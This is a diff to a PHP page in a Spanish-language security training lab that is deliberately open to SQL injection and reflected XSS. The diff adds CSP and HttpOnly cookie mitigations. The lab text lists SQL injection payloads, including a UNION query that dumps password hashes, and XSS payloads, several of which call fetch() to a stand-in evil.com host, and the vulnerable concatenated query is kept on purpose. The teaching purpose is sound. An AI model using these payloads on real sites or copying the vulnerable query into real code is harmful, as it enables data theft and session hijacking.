@@ -7,9 +7,20 @@
  * 1. SQL Injection: query armada por concatenacion directa
  * 2. XSS reflejado: el output no usa htmlspecialchars()
  * 
+ * MITIGACION DE SUPERFICIE:
+ * - CSP bloquea fetch/XHR a externos (no BeEF, no exfiltracion)
+ * - HttpOnly cookie (XSS no puede leer document.cookie)
+ * - El XSS sigue ejecutando para fines educativos (alert funciona)
+ * 
  * NO USAR EN PRODUCCION - Solo para fines educativos
  */
 
+// CSP: permite scripts inline (XSS funciona) pero bloquea conexiones externas
+header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self'; frame-ancestors 'self';");
+
+// Cookies HttpOnly + SameSite para reducir impacto del XSS
+ini_set('session.cookie_httponly', 1);
+ini_set('session.cookie_samesite', 'Strict');
 session_start();
 
 $_SESSION['user_id'] = $_SESSION['user_id'] ?? 2;
@@ -29,7 +40,10 @@ $labInfo = [
             <li><strong>SQL Injection:</strong> La query se arma concatenando el input directamente</li>
             <li><strong>XSS reflejado:</strong> Los resultados se muestran sin escapar</li>
         </ol>
-        <p class="mb-0">Observa la URL cuando inyectas algo - el input se refleja en la pagina.</p>
+        <div class="alert alert-info small mt-2 mb-0">
+            <strong>Mitigacion aplicada:</strong> CSP bloquea conexiones externas + cookie HttpOnly.
+            El XSS ejecuta (alert funciona) pero no puede robar sesion ni contactar servidores externos.
+        </div>
     ',
     'exploit' => '# Ver todos los clientes (bypass del filtro)
 ?q=\' OR \'1\'=\'1
@@ -37,14 +51,24 @@ $labInfo = [
 # Extraer tabla users con UNION
 ?q=\' UNION SELECT id,username,password_md5,email,role,created_at,7,8 FROM users-- 
 
-# XSS basico
-?q=<script>alert(document.cookie)</script>
+# XSS basico (FUNCIONA - el alert se ejecuta)
+?q=<script>alert(\'XSS ejecutado!\')</script>
 
-# XSS con robo de sesion (conceptual)
-?q=<script>fetch(\'http://evil.com/steal?\'+document.cookie)</script>',
-    'prevention' => '// ESTE ARCHIVO (vulnerable):
-$q = "SELECT * FROM clients WHERE name LIKE \'%" . $_GET[\'q\'] . "%\'";
-echo $row[\'name\']; // SIN escapar
+# XSS robo de cookie (FALLA - cookie es HttpOnly)
+?q=<script>alert(document.cookie)</script>
+# Resultado: cookie vacia porque es HttpOnly
+
+# XSS exfiltracion (BLOQUEADO por CSP)
+?q=<script>fetch(\'http://evil.com/steal?data=test\')</script>
+# Resultado: CSP bloquea la conexion externa',
+    'prevention' => '// ESTE ARCHIVO (vulnerable pero mitigado):
+// CSP: script-src \'self\' \'unsafe-inline\'; connect-src \'self\'
+// Cookie: HttpOnly + SameSite=Strict
+
+// El XSS ejecuta PERO:
+// - No puede leer document.cookie (HttpOnly)
+// - No puede hacer fetch() a externos (CSP connect-src)
+// - No puede cargar scripts externos (CSP script-src)
 
 // buscar_secure.php (seguro):
 $stmt = $pdo->prepare("SELECT * FROM clients WHERE name LIKE ?");
@@ -148,8 +172,12 @@ include __DIR__ . '/../shared/header.php';
         <div class="fs-3 me-3">XSS!</div>
         <div>
             <strong>Se detecto contenido HTML/JS en el input</strong><br>
-            <small>El termino de busqueda se muestra arriba SIN escapar. 
-            Si abriste esta URL en el browser, el script ya se ejecuto.</small>
+            <small>El script se ejecuto, PERO esta mitigado:</small>
+            <ul class="small mb-0 mt-1">
+                <li><code>document.cookie</code> esta vacio (HttpOnly)</li>
+                <li><code>fetch()</code> a externos bloqueado (CSP)</li>
+                <li>No se puede cargar BeEF ni scripts externos (CSP)</li>
+            </ul>
         </div>
     </div>
     <?php endif; ?>
@@ -252,12 +280,12 @@ include __DIR__ . '/../shared/header.php';
                     </ul>
                 </div>
                 <div class="col-md-6">
-                    <h6>XSS</h6>
+                    <h6>XSS (mitigado con CSP + HttpOnly)</h6>
                     <ul class="small">
-                        <li><a href="?q=<script>alert('XSS')</script>">Alert basico</a></li>
-                        <li><a href="?q=<img src=x onerror=alert('XSS')>">Img onerror</a></li>
-                        <li><a href="?q=<svg onload=alert('XSS')>">SVG onload</a></li>
-                        <li><a href="?q=<body onload=alert('XSS')>">Body onload</a></li>
+                        <li><a href="?q=<script>alert('XSS')</script>">✅ Alert basico (funciona)</a></li>
+                        <li><a href="?q=<script>alert(document.cookie)</script>">⚠️ Leer cookie (vacia - HttpOnly)</a></li>
+                        <li><a href="?q=<img src=x onerror=alert('XSS')>">✅ Img onerror (funciona)</a></li>
+                        <li><a href="?q=<script>fetch('http://evil.com')</script>">❌ Exfiltrar (bloqueado CSP)</a></li>
                     </ul>
                 </div>
             </div>
